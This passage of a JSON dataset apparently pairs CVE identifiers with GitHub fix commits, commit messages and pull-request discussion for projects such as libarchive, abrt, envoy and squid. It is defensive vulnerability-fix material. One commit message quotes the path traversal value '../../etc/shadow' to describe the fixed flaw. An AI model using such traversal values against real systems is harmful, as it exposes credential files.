            "other_info": "http_client: Improve certificate verification Thanks for the bugfix! Can you please describe the conditions where the bug is present, what the bug is, and if there is security impact?\r\n\r\nIs there a potential test to make sure the bug is mitigated? > Thanks for the bugfix! Can you please describe the conditions where the bug is present, what the bug is, and if there is security impact?\r\n> \r\n> Is there a potential test to make sure the bug is mitigated?\r\n\r\nThis fixes an issue that has been reported by a user about how the server certificate is verified against the hostname osquery is trying to connect to. Without this callback, Boost always allows the connection regardless.\r\n\r\nWe can try to tweak the verification settings and see if we can just validate the hostname check in the tests! How does this intersect with `--tls_server_certs`? How do people toggling whether they want verification or not? This fixes #6212 This will conflict with PR #6044. That change removes client_options_.sni_hostname_ and this PR has a dependency on it. @verntx good call. I definitely like the restructuring in #6044, @alessandrogario is there anyway you could rebase on top of that PR and just keep the callback for the sni verification? This has been rebased on #6044 as requested; since that PR has not been merged yet, this branch also brought @theopolis commits (I've marked this as do-not-merge for now).\r\n\r\nThe fix is a one liner, so maybe it can be moved inside that other PR",
            "pr_title_words": 4,
            "comments_words": 247,
            "total_other_info_words": 251
        },
        {
            "cve-id": "CVE-2020-9483",
            "commit_url": "https://github.com/apache/skywalking/commit/2b6aae3b733f9dbeae1d6eff4f1975c723e1e7d1",
            "commit_msg": "Fix security issue of the metrics query",
            "commit_msg_words": 7,
            "other_info": "[CVE] Fix SQL Injection vulnerability in H2/MySQL implementation. # [Codecov](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=h1) Report\n> Merging [#4639](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=desc) into [master](https://codecov.io/gh/apache/skywalking/commit/5646dfbb2365d3232ddb35263c34e0377fce4dc2&el=desc) will **decrease** coverage by `0.00%`.\n> The diff coverage is `0.00%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/apache/skywalking/pull/4639/graphs/tree.svg?width=650&height=150&src=pr&token=qrILxY5yA8)](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=tree)\n\n```diff\n@@            Coverage Diff             @@\n##           master    #4639      +/-   ##\n==========================================\n- Coverage   28.73%   28.72%   -0.01%     \n==========================================\n  Files        1192     1192              \n  Lines       26047    26056       +9     \n  Branches     3480     3480              \n==========================================\n  Hits         7484     7484              \n- Misses      17881    17890       +9     \n  Partials      682      682              \n```\n\n\n| [Impacted Files](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=tree) | Coverage \u0394 | |\n|---|---|---|\n| [.../storage/plugin/jdbc/h2/dao/H2MetricsQueryDAO.java](https://codecov.io/gh/apache/skywalking/pull/4639/diff?src=pr&el=tree#diff-b2FwLXNlcnZlci9zZXJ2ZXItc3RvcmFnZS1wbHVnaW4vc3RvcmFnZS1qZGJjLWhpa2FyaWNwLXBsdWdpbi9zcmMvbWFpbi9qYXZhL29yZy9hcGFjaGUvc2t5d2Fsa2luZy9vYXAvc2VydmVyL3N0b3JhZ2UvcGx1Z2luL2pkYmMvaDIvZGFvL0gyTWV0cmljc1F1ZXJ5REFPLmphdmE=) | `0.00% <0.00%> (\u00f8)` | |\n\n------\n\n[Continue to review full report at Codecov](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=continue).\n> **Legend** - [Click here to learn more](https://docs.codecov.io/docs/codecov-delta)\n> `\u0394 = absolute <relative> (impact)`, `\u00f8 = not affected`, `? = missing data`\n> Powered by [Codecov](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=footer). Last update [5646dfb...2b6aae3](https://codecov.io/gh/apache/skywalking/pull/4639?src=pr&el=lastupdated). Read the [comment docs](https://docs.codecov.io/docs/pull-request-comments).",
            "pr_title_words": 8,
            "comments_words": 121,
            "total_other_info_words": 129
        },
        {
            "cve-id": "CVE-2020-15231",
            "commit_url": "https://github.com/mapfish/mapfish-print/commit/89155f2506b9cee822e15ce60ccae390a1419d5e",
            "commit_msg": "Remove JSONP support\n\nSee: https://github.com/mapfish/mapfish-print/security/code-scanning/5?query=ref%3Arefs%2Fheads%2Fmaster",
            "commit_msg_words": 5,
            "other_info": "Fix some security issues This pull request **fixes 4 alerts** when merging 89155f2506b9cee822e15ce60ccae390a1419d5e into afc248cbfdf176789a0e848d876c0f34e8d555bc - [view on LGTM.com](https://lgtm.com/projects/g/mapfish/mapfish-print/rev/pr-baff6ebf44b644234ad9e03661e3092e9733e02f)\n\n**fixed alerts:**\n\n* 3 for Cross\\-site scripting\n* 1 for Resolving XML external entity in user\\-controlled data \ud83d\udc4b @sbrunner, can you elaborate a bit more about the issues at hand? \r\nIm from [Snyk](snyk.io) and if these are indeed vulnerabilities we would like to add it to our database with full context.  @gurshafriri \r\nI just change the title, for me, its potential security vulnerabilities detected by CodeQL I provide the links in the commits, all fixed issues:\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/3?query=ref%3Arefs%2Fheads%2Fmaster\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/5?query=ref%3Arefs%2Fheads%2Fmaster\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/6?query=ref%3Arefs%2Fheads%2Fmaster\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/7?query=ref%3Arefs%2Fheads%2Fmaster I also publish my 2 first GitHub Security Advisories. @sbrunner thanks - but the links are broken for us. \r\nDo you have the GitHub Security Advisory ID's?  Like this?\r\n* https://github.com/mapfish/mapfish-print/security/advisories/GHSA-w534-q4xf-h5v2\r\n* https://github.com/mapfish/mapfish-print/security/advisories/GHSA-vjv6-gq77-3mjw",
            "pr_title_words": 4,
            "comments_words": 132,
            "total_other_info_words": 136
        },
        {
            "cve-id": "CVE-2020-9308",
            "commit_url": "https://github.com/libarchive/libarchive/commit/94821008d6eea81e315c5881cdf739202961040a",
            "commit_msg": "RAR5 reader: reject files that declare invalid header flags\n\nOne of the fields in RAR5's base block structure is the size of the\nheader. Some invalid files declare a 0 header size setting, which can\nconfuse the unpacker. Minimum header size for RAR5 base blocks is 7\nbytes (4 bytes for CRC, and 3 bytes for the rest), so block size of 0\nbytes should be rejected at header parsing stage.\n\nThe fix adds an error condition if header size of 0 bytes is detected.\nIn this case, the unpacker will not attempt to unpack the file, as the\nheader is corrupted.\n\nThe commit also adds OSSFuzz #20459 sample to test further regressions\nin this area.",
            "commit_msg_words": 116,
            "other_info": "RAR5 reader: reject files that declare invalid header flags The assigned CVE is [CVE-2020-9308](https://nvd.nist.gov/vuln/detail/CVE-2020-9308)",
            "pr_title_words": 9,
            "comments_words": 5,
            "total_other_info_words": 14
        },
        {
            "cve-id": "CVE-2020-12845",
            "commit_url": "https://github.com/cherokee/webserver/commit/7d8d903399c168708ace4bc2cdd8a551777fa1b3",
            "commit_msg": "Don't process empty input for cherokee_buffer_decode_base64",
            "commit_msg_words": 6,
            "other_info": "Fix CVE-2020-12845",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2020-10028",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/17427ec995be720dc3d31331d534681d29ae9648",
            "commit_msg": "drivers: gpio: fix syscall handlers\n\nNo driver object checks were being performed for 3 APIs.\n\nSigned-off-by: Andrew Boie <andrew.p.boie@intel.com>\nSigned-off-by: Flavio Ceolin <flavio.ceolin@intel.com>",
            "commit_msg_words": 23,
            "other_info": "Backport v2.1: drivers: gpio: fix syscall handlers",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-11046",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/ed53cd148f43cbab905eaa0f5308c2bf3c48cc37",
            "commit_msg": "Fixed #6006: bounds checks in update_read_synchronize",
            "commit_msg_words": 6,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        }
    ],
    "2015": [
        {
            "cve-id": "CVE-2015-6569",
            "commit_url": "https://github.com/floodlight/floodlight/commit/7f5bedb625eec3ff4d29987c31cef2553a962b36",
            "commit_msg": "fix data races bug in LoadBalancer module",
            "commit_msg_words": 7,
            "other_info": "fix data races in LoadBalancer module @xuraylei Have you run the unit tests after making these changes? Looks great otherwise!\n\nThanks!\n @rizard  I have tested them using ant tests command. \n @xuraylei Cool, thanks!",
            "pr_title_words": 6,
            "comments_words": 27,
            "total_other_info_words": 33
        },
        {
            "cve-id": "CVE-2015-0278",
            "commit_url": "https://github.com/libuv/libuv/commit/66ab38918c911bcff025562cf06237d7fedaba0c",
            "commit_msg": "unix: call setgoups before calling setuid/setgid\n\nPartial fix for #1093",
            "commit_msg_words": 10,
            "other_info": "Merge v0.10 into v1.x > This breaks the fs_fstat test on Linux and only in the gyp build because neither _BSD_SOURCE, _SVID_SOURCE or _XOPEN_SOURCE seem to be defined. Still investigating that.\n\nI was wrong: the test also fails when I revert to dfdcfc0, it's not a regression caused by this PR.  I'll file an issue.  (edit: see #43.)\n LGTM then!\nOn Dec 5, 2014 7:36 PM, \"Ben Noordhuis\" notifications@github.com wrote:\n\n> This breaks the fs_fstat test on Linux and only in the gyp build because\n> neither _BSD_SOURCE, _SVID_SOURCE or _XOPEN_SOURCE seem to be defined.\n> Still investigating that.\n> \n> I was wrong: the test also fails when I revert to dfdcfc0\n> https://github.com/libuv/libuv/commit/dfdcfc0c4dc0a1bf8c49aba7e53b5ec590d1c71d,\n> it's not a regression caused by this PR. I'll file an issue.\n> \n> \u2014\n> Reply to this email directly or view it on GitHub\n> https://github.com/libuv/libuv/pull/41#issuecomment-65833812.\n Maybe we should release a 0.10.x\nOn Dec 5, 2014 7:36 PM, \"Ben Noordhuis\" notifications@github.com wrote:\n\n> This breaks the fs_fstat test on Linux and only in the gyp build because\n> neither _BSD_SOURCE, _SVID_SOURCE or _XOPEN_SOURCE seem to be defined.\n> Still investigating that.\n> \n> I was wrong: the test also fails when I revert to dfdcfc0\n> https://github.com/libuv/libuv/commit/dfdcfc0c4dc0a1bf8c49aba7e53b5ec590d1c71d,\n> it's not a regression caused by this PR. I'll file an issue.\n> \n> \u2014\n> Reply to this email directly or view it on GitHub\n> https://github.com/libuv/libuv/pull/41#issuecomment-65833812.\n > Maybe we should release a 0.10.x\n\nThat's a good idea.  I'll give it a try tomorrow, when you are around.\n > That's a good idea. I'll give it a try tomorrow, when you are around.\n\nKewl, ping me on IRC then.",
            "pr_title_words": 4,
            "comments_words": 272,
            "total_other_info_words": 276
        },
        {
            "cve-id": "CVE-2015-3150",
            "commit_url": "https://github.com/abrt/abrt/commit/7814554e0827ece778ca88fd90832bd4d05520b1",
            "commit_msg": "dbus: avoid race-conditions in tests for dum dir availability\n\nFlorian Weimer <fweimer@redhat.com>\n\n    dump_dir_accessible_by_uid() is fundamentally insecure because it\n    opens up a classic time-of-check-time-of-use race between this\n    function and and dd_opendir().\n\nRelated: #1214745\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>",
            "commit_msg_words": 36,
            "other_info": "RHEL7: abrt ccpp vulnerabilities",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2015-8080",
            "commit_url": "https://github.com/redis/redis/commit/01173bc8097391b2e46c4d56a080709c219fda53",
            "commit_msg": "lua_struct.c/getnum: throw error if overflow happen\n\nFix issue #2855",
            "commit_msg_words": 9,
            "other_info": "2.8 Hello,\n\ncan you please elaborate a bit? Like how much numbers, how to replicate, and the error reported by Redis. Thanks!\n when I use command like redis-cli -r 10000000 lpush mylist aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[1k content]\u3002the redis will use a lot of memory\u3002\n redis_version:1.3.3\narch_bits:64\nmultiplexing_api:epoll\nprocess_id:26560\nuptime_in_seconds:106\nuptime_in_days:0\nconnected_clients:2\nconnected_slaves:0\nblocked_clients:0\nused_memory:179048675\nused_memory_human:170.75M\nchanges_since_last_save:559778\nbgsave_in_progress:0\nlast_save_time:1264264099\nbgrewriteaof_in_progress:0\ntotal_connections_received:39\ntotal_commands_processed:1181478\nvm_enabled:1\nrole:master\nvm_conf_max_memory:0\nvm_conf_page_size:256\nvm_conf_pages:104857600\nvm_stats_used_pages:0\nvm_stats_swapped_objects:0\nvm_stats_swappin_count:1\nvm_stats_swappout_count:1\nvm_stats_io_newjobs_len:0\nvm_stats_io_processing_len:0\nvm_stats_io_processed_len:0\nvm_stats_io_waiting_clients:0\nvm_stats_io_active_threads:0\ndb0:keys=1,expires=0\n\nthis info show  redis can't VM one key\u3002\n my redis config is vm-max-memory 0\nI want use reids list pop push make a simple queue \u3002\nbut I find redis can't VM a key lists  to many numbers\u3002like 1000 0000 numbers and use a little memory\u3002and it will use nearby  80% system memory at most\u3002and when i run this long time \u3002\nthe linux will crash [my max system memory is 4G ]\u3002\n Hello, thanks for the info, could you please enter IRC irc.freenode.org #redis for a chat?\n Can't remember the details, but this issue is now closed.",
            "pr_title_words": 1,
            "comments_words": 170,
            "total_other_info_words": 171
        },
        {
            "cve-id": "CVE-2015-7510",
            "commit_url": "https://github.com/systemd/systemd/commit/cb31827d62066a04b02111df3052949fda4b6888",
            "commit_msg": "nss-mymachines: do not allow overlong machine names\n\nhttps://github.com/systemd/systemd/issues/2002",
            "commit_msg_words": 8,
            "other_info": "nss-mymachines: do not allow overlong machine names",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2015-3159",
            "commit_url": "https://github.com/abrt/abrt/commit/9943a77bca37a0829ccd3784d1dfab37f8c24e7b",
            "commit_msg": "a-a-i-d-t-a-cache: sanitize arguments\n\nParse command lines arguments and use them to create new arguments for\nexec(). No black listing algorithm would be safe enough. The only\nallowed arguments are the following:\n* v - verbose\n* y - noninteractive\n* repo - enable only repositories whose names match the pattern\n* exact - download packages for the specified files\n* ids - passed as magic proc fd path to the wrapped executable\n\nThe wrapper opens the list of needed build ids passes /proc/self/fd/[fd]\nto the wrapped process. This allows us to open the file with caller's\nUID/GID in order to avoid information disclosures.\n\nForbidden arguments:\n* cache - allows regular users to create a user writable dump directory\n* tmpdir - the same as above\n* size_mb - no need to allow users to fiddle with the cache size\n\nRelated: #1216962\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>",
            "commit_msg_words": 145,
            "other_info": "RHEL7: abrt ccpp vulnerabilities",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2015-20110",
            "commit_url": "https://github.com/jhipster/generator-jhipster/commit/79fe5626cb1bb80f9ac86cf46980748e65d2bdbc",
            "commit_msg": "fixed timing attack vulnerability in TokenProvider #2095",
            "commit_msg_words": 7,
            "other_info": "fixed timing attack vulnerability in TokenProvider I'm merging this because migrating to JWT will take some time",
            "pr_title_words": 6,
            "comments_words": 11,
            "total_other_info_words": 17
        },
        {
            "cve-id": "CVE-2015-3151",
            "commit_url": "https://github.com/abrt/libreport/commit/239c4f7d1f47265526b39ad70106767d00805277",
            "commit_msg": "dd: harden functions against directory traversal issues\n\nTest correctness of all accessed dump dir files in all dd* functions.\nBefore this commit, the callers were allowed to pass strings like\n\"../../etc/shadow\" in the filename argument of all dd* functions.\n\nRelated: #1214457\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>",
            "commit_msg_words": 45,
            "other_info": "RHEL7: copy file chown Went through the code and it seems to mitigate time of check / time of use race conditions and improve malicious path handling. Ack.",
            "pr_title_words": 4,
            "comments_words": 24,
            "total_other_info_words": 28
        },
        {
            "cve-id": "CVE-2015-2304",
            "commit_url": "https://github.com/libarchive/libarchive/commit/59357157706d47c365b2227739e17daba3607526",
            "commit_msg": "Add ARCHIVE_EXTRACT_SECURE_NOABSOLUTEPATHS option\n\nThis fixes a directory traversal in the cpio tool.",
            "commit_msg_words": 12,
            "other_info": "Fix directory traversal in bsdcpio This is a nice start.  The tests need a few more checks to verify that the security check really does prevent or not prevent the file creation.  (Right now, you're just verifying that the security check returns an error.)\n Should be fixed now. I use `assertFileExists(\"/tmp/abs\")`, then `unlink(\"/tmp/abs\")` in the test without the flag, and `assertFileNotExists(\"/tmp/abs\")` in the one with the flag.\n\nNot sure if using `unlink()` is ok though.\n If we're going to use a fixed name, we need to use one that is reasonably certain to not interfere with any other user of /tmp.  How about\n   /tmp/libarchive_test-test_write_disk_secure-absolute_path.tmp\n Sounds good to me. I just updated the PR.\n Thank you.  I'll merge this now; we will of course need to update this logic soon to identify absolute paths on Windows as well.\n CVE-2015-2304 was assigned for this at some point.OSVDB 117148 corresponds to this entry as well.\n I'm wondering if this fix is correct for the `cpio -dumpl <abspath>` case, used in quite a few scripts (FreeBSD ports's macro ${COPY_TREE_SHARE} as a prime example) to hardlink something from place a to b, falling back top copy if no hardlink is possible.\n\nThe error is thrown on the path that is the combination of the <abspath> argument and the relative path provided by stdin. So if input path is verified to be relative and abspath argument is identical to it's realpath, there is no issue and the error thrown is a false positive. Please correct me if I'm missing something here.",
            "pr_title_words": 5,
            "comments_words": 250,
            "total_other_info_words": 255
        },
        {
            "cve-id": "CVE-2015-5221",
            "commit_url": "https://github.com/jasper-software/jasper/commit/df5d2867e8004e51e18b89865bc4aa69229227b3",
            "commit_msg": "CVE-2015-5221",
            "commit_msg_words": 1,
            "other_info": "CVE-2015-5221",
            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2015-3158",
            "commit_url": "https://github.com/picketlink/picketlink-bindings/commit/341a37aefd69e67b6b5f6d775499730d6ccaff0d",
            "commit_msg": "[PLINK-708] - Checking if user is authorized right after authentication.",
            "commit_msg_words": 10,
            "other_info": "[PLINK-708] - Checking if user is authorized right after authentication. [picketlink-bindings #270](https://picketlink.ci.cloudbees.com/job/picketlink-bindings/270/) SUCCESS\nThis pull request looks good",
            "pr_title_words": 10,
            "comments_words": 8,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2015-1870",
            "commit_url": "https://github.com/abrt/abrt/commit/8939398b82006ba1fec4ed491339fc075f43fc7c",
            "commit_msg": "make the dump directories owned by root by default\n\nIt was discovered that the abrt event scripts create a user-readable\ncopy of a sosreport file in abrt problem directories, and include\nexcerpts of /var/log/messages selected by the user-controlled process\nname, leading to an information disclosure.\n\nThis issue was discovered by Florian Weimer of Red Hat Product Security.\n\nRelated: #1212868\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>",
            "commit_msg_words": 63,
            "other_info": "RHEL7: abrt ccpp vulnerabilities",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2015-1869",
            "commit_url": "https://github.com/abrt/abrt/commit/3287aa12eb205cff95cdd00d6d6c5c9a4f8f0eca",
            "commit_msg": "daemon: allow only root user to trigger the post-create\n\nThere is no reason to allow non-root users to trigger this\nfunctionality. Regular users can create abrt problems only through\nabrtd or abrt-dbus and both triggers the post-create.\n\nOther hooks run under root user (CCpp, Koops, VMCore, Xorg).\n\nRelated: #1212861\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>",
            "commit_msg_words": 53,
            "other_info": "RHEL7: daemon hardening",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        }
    ],
    "2024": [
        {
            "cve-id": "CVE-2024-24824",
            "commit_url": "https://github.com/Graylog2/graylog2-server/commit/75ef2b8d60e7d67f859b79fe712c8ae7b2e861d8",
            "commit_msg": "Restrict classes allowed for cluster config and event types (#18165) (#18179)\n\n* Restrict classes allowed for cluster config and event types (#18165)\r\n\r\nAdd a new safe_classes configuration option to restrict the classes allowed to be used\r\nas cluster config and event types.\r\nThe configuration option allows to specify a comma-separated set of prefixes matched\r\nagainst the fully qualified class name.\r\n\r\nFor now, the default value for the configuration is org.graylog.,org.graylog2., which will\r\nallow all classes that Graylog maintains.\r\n\r\nThis should work out of the box for almost all setups. Changing the default value might\r\nonly be necessary if external plugins require cluster config or event types outside the\r\n\"org.graylog.\" or \"org.graylog2.\" namespaces. If that is the case, the configuration setting\r\ncan be adjusted to cover this use case, e.b. by setting it to\r\n\r\n    safe_classes = org.graylog.,org.graylog2.,custom.plugin.namespace.\r\n\r\nif said classes are located within the custom.plugin.namespace package.\r\n\r\nRefs: https://github.com/Graylog2/graylog2-server/security/advisories/GHSA-p6gg-5hf4-4rgj\r\n\r\n(cherry picked from commit 813203263b06dda18e2aed68ae92b34277f904b4)\r\n\r\n* Use javax.inject.Inject instead of jakarta.inject.Inject\r\n\r\n* Use javax.ws.rs instead of jakarta.ws.rs\r\n\r\n---------\r\n\r\nCo-authored-by: Othello Maurer <othello@graylog.com>",
            "commit_msg_words": 90,
            "other_info": "Restrict classes allowed for cluster config and event types (#18165)",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2024-22365",
            "commit_url": "https://github.com/linux-pam/linux-pam/commit/031bb5a5d0d950253b68138b498dc93be69a64cb",
            "commit_msg": "pam_namespace: protect_dir(): use O_DIRECTORY to prevent local DoS situations\n\nWithout O_DIRECTORY the path crawling logic is subject to e.g. FIFOs\nbeing placed in user controlled directories, causing the PAM module to\nblock indefinitely during `openat()`.\n\nPass O_DIRECTORY to cause the `openat()` to fail if the path does not\nrefer to a directory.\n\nWith this the check whether the final path element is a directory\nbecomes unnecessary, drop it.",
            "commit_msg_words": 68,
            "other_info": "Prepare for 1.6.0 release",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2024-23689",
            "commit_url": "https://github.com/ClickHouse/clickhouse-java/commit/4f8d9303eb991b39ec7e7e34825241efa082238a",
            "commit_msg": "Mask sensitive option in log",
            "commit_msg_words": 5,
            "other_info": "Mask sensitive option in log",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2024-23327",
            "commit_url": "https://github.com/envoyproxy/envoy/commit/63895ea8e3cca9c5d3ab4c5c128ed1369969d54a",
            "commit_msg": "Fix crash from AWS NLB healthchecks when proxy protocol is enabled\n\nFix: [CVE-2024-23327](https://github.com/envoyproxy/envoy/security/advisories/GHSA-4h5x-x9vh-m29j)\n\nSigned-off-by: Jacob Neil Taylor <me@jacobtaylor.id.au>\nSigned-off-by: Greg Greenway <ggreenway@apple.com>\nSigned-off-by: Ryan Northey <ryan@synca.io>",
            "commit_msg_words": 26,
            "other_info": "repo: Assorted CVE fixes (IMPORTANT!) CC @envoyproxy/coverage-shephards: FYI only for changes made to `(test/per_file_coverage.sh)`.\nenvoyproxy/coverage-shephards assignee is @RyanTheOptimist\n\n\n<details>\n\t<summary>:cat:</summary>\n\nCaused by: https://github.com/envoyproxy/envoy/pull/32300 was opened by phlax.\n\nsee: [more](https://github.com/envoyproxy/envoy/pull/32300), [trace](https://prod.repokitteh.app/traces/ui/envoyproxy/envoy/53df9610-c75a-11ee-99e2-8c29c907fa82).\n</details> > Can we update the PR description to link to the CVEs that this addresses?\r\n\r\ni think we have been here before 8/\r\n\r\nthis PR will be rebased, the commits contain the linked CVEs\r\n\r\nthis is what needs checking @RyanTheOptimist if you could look through that would be appreciated > > Can we update the PR description to link to the CVEs that this addresses?\r\n> \r\n> i think we have been here before 8/\r\n> \r\n> this PR will be rebased, the commits contain the linked CVEs\r\n> \r\n> this is what needs checking @RyanTheOptimist if you could look through that would be appreciated\r\n\r\nyes, i agree that the code changes look good. It would still be good to copy the links to the CVEs into the PR description so that when we see the commit in git history it has the relevant context. i already have to copy this information to each commit on each branch - ie 20+ and also to the release summaries\r\n\r\ngiven that the information is there **and needs to be checked** ill leave any further copypasta as an exercise for the reader I do not believe that \"Assorted CVE fixes (IMPORTANT!)\" meeds the requirements of a PR description from CONTRIBUTING.md. Feel free to get a second opinion from another maintainer.\r\n\r\n```\r\n* Your PR description should have details on what the PR does. If it fixes an existing issue it\r\n  should end with \"Fixes #XXX\".\r\n``` comment updated I believe [the commit](https://github.com/envoyproxy/envoy/pull/32300/commits/f1cd344edb2775eef8b9d456c76e4a249f1bac8f) to sanitize the proxy protocol values seems wrong. The [sanitizeUtf8String](https://github.com/envoyproxy/envoy/blob/6231a648424d6ae5209d5346960e825a216f95fa/source/common/protobuf/yaml_utility.cc#L341) function used modifies the bytes in a non-recoverable way, but the actual value isn't always meant to be a valid utf8 string. I believe the [proxy protocol spec](https://www.haproxy.org/download/1.8/doc/proxy-protocol.txt) allows for this.\r\n\r\nMaterially, Google's private service connect (PSC) feature encodes a TLV value as a binary encoded int64. With this commit there's no way to recover the original value in most cases. Example value bytes that should be a valid PSC id\r\n`00 22 6b cf 0a 00 00 02` (decodes to `9688686178336770`)\r\n\r\nI think either using set_bytes within `ProtobufWkt::Value` (which doesn't seem to exist today) or escaping the bad bytes in a reverseable way would be necessary. I think this happened because Envoy is using a protobuf string for both moving data around internally, and sending protobufs flattened over the network. I agree this is an unintended change in behavior. I'm not sure what the best way to fix this is. Can you open an issue for this @fedya-at-db ? Thanks, I filed an issue [here](https://github.com/envoyproxy/envoy/issues/32718). ****",
            "pr_title_words": 5,
            "comments_words": 452,
            "total_other_info_words": 457
        },
        {
            "cve-id": "CVE-2024-25679",
            "commit_url": "https://github.com/p-quic/pquic/commit/2dbc6bbd71ddffe0f040016240541658b6e3ebba",
            "commit_msg": "discard the keys after handshake is done; use the correct original_destination_connection_id; discard the re-transmission packets correctly; limit the active_connection_id",
            "commit_msg_words": 19,
            "other_info": "Minor Fix The code looks good. Have you done any test to ensure it fixes these issues ?",
            "pr_title_words": 2,
            "comments_words": 16,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2024-24806",
            "commit_url": "https://github.com/libuv/libuv/commit/0f2d7e784a256b54b2385043438848047bc2a629",
            "commit_msg": "fix: always zero-terminate idna output\n\nFixes: https://github.com/libuv/libuv/security/advisories/GHSA-f74f-cvh7-c6q6",
            "commit_msg_words": 7,
            "other_info": "Merge 1.48.0 to master",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2024-23638",
            "commit_url": "https://github.com/squid-cache/squid/commit/290ae202883ac28a48867079c2fb34c40efd382b",
            "commit_msg": "Just close after a write(2) response sending error (#1582)\n\n    FATAL: assertion failed: Http1Server.cc:322: \"rep\"\n\n2015 commit 21cd322 started to continue ClientStream processing after\nsocket write(2) failures. In most cases, the code still \"worked\". For\nexample, initiateClose() would close the client-Squid connection, and\nconnStateClosed() would be called before Store has a chance to deliver\nresponse body data requested by pullData() in writeComplete().\n\nHowever, that response body data could sometimes reach Server, and\nhandleReply() would assert because startOfOutput() says that we have not\nwritten the headers, but ClientStream state (i.e. a nil `rep` parameter)\nsays that we have. These assertion can be triggered by disabling\ninitiateClose(), and they can probably be triggered by traffic as well.\n\nNow, after a Comm::Write() error, we terminateAll() client transactions\non the failed connection[^1] and do not call afterClientWrite() that is\nnot equipped to handle I/O errors and would continue ClientStream\nprocessing if called.\n\nThis bug was discovered and detailed by Joshua Rogers at\nhttps://megamansec.github.io/Squid-Security-Audit/stream-assert.html\nwhere it was filed as \"Implicit Assertion in Stream Handling\".\n\n[^1]: We terminateAll() instead of potentially postponing closure with\ninitiateClose() because the failed client-Squid connection most likely\ncannot be salvaged for, say, reading the remainder of the request body.",
            "commit_msg_words": 197,
            "other_info": "v6 Next Backports",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2024-23324",
            "commit_url": "https://github.com/envoyproxy/envoy/commit/29989f6cc8bfd8cd2ffcb7c42711eb02c7a5168a",
            "commit_msg": "Proxy protocol: sanitise non utf8 chars in TLVs\n\nFix [CVE-2024-23324](https://github.com/envoyproxy/envoy/security/advisories/GHSA-gq3v-vvhj-96j6)\n\nSigned-off-by: Kateryna Nezdolii <nezdolik@spotify.com>\nSigned-off-by: Ryan Northey <ryan@synca.io>",
            "commit_msg_words": 18,
